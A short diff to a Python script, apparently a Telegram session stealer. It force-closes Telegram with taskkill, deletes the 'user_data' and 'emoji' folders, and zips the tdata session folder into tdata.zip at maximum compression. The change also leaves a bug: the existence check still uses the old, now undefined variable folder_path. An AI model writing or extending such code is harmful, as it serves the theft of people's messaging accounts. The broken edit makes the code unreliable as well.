@@ -31,10 +31,12 @@ def task_kill():
     os.system('taskkill /f /im Telegram.exe')
 
 def delete_fold():
-    folder_path = os.path.join(user, 'user_data')
+    folder_path1 = os.path.join(user, 'user_data')
+    folder_path2 = os.path.join(user, 'emoji')
     time.sleep(2)
     if os.path.isdir(folder_path) == True:
-        shutil.rmtree(folder_path)
+        shutil.rmtree(folder_path1)
+        shutil.rmtree(folder_path2)
 
 def archivation():
     with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
